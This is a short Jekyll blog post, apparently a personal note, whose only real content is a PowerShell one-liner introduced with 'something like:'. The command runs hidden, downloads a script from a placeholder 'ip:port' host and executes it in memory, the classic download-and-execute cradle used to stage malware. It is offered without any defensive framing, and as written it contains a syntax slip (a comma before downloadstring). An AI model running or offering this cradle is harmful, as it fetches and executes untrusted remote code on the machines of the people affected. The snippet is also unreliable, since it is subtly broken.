---
layout: post
title: "Lillian Warner, powershell info"
date: 2017-06-23
---
			<title>{{ page.title }}</title>
			<nav>
	    		<ul>
	        		<li><a href="/">Home</a></li>
	        		<li><a href="/about">About</a></li>
        			<li><a href="/projects">Projects</a></li>
        			<li><a href="/blog">Blog</a></li>
				<li><a href="/contact">Contact Me</a></li>
	    		</ul>
			</nav>
something like:
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient),downloadstring('http://ip:port/file'))"
